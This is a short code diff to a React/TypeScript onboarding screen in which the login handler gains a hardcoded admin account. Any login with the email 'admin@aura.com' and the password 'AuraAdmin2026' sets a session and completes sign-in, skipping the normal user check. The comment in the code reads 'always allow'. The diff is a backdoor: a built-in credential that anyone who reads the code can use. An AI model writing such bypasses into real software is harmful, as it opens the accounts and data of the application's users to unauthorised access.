@@ -69,6 +69,17 @@ export default function OnboardingScreen({
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
     setLoginError("");
+
+    // Hardcoded admin account — always allow
+    if (
+      loginEmail.toLowerCase() === "admin@aura.com" &&
+      loginPassword === "AuraAdmin2026"
+    ) {
+      localStorage.setItem("wiz_session", loginEmail);
+      onComplete(loginEmail);
+      return;
+    }
+
     const users = getUsers();
     const match = users.find(
       (u) =>
